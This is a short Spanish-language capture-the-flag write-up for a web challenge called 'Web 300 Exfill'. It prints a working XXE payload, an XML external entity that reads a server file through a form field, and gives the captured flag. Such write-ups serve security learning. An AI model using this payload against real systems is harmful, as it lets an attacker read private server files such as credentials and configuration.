# Web 300 Exfill

Encuentra la vulnerabilidad en el siguiente sitio web y lee la flag que esta en /app/app/flag.txt

Un sitio web con la vulnerabilidad XXE, nos daban la ruta de la flag asi que resulto un poco mas facil.

Subimos el siguiente XML y obtuvimos la flag

```xml
<?xml version="1.0"?>
<!DOCTYPE directorio [<!ENTITY read SYSTEM 'file:///app/app/flag.txt'> ]>
<directorio>
  <contacto>
    <nombre>some &read;</nombre>
    <telefono>555</telefono>
  </contacto>
</directorio>
```

## FLAG
hackdef{d0_n0t_tru5t_xml_f1l3s}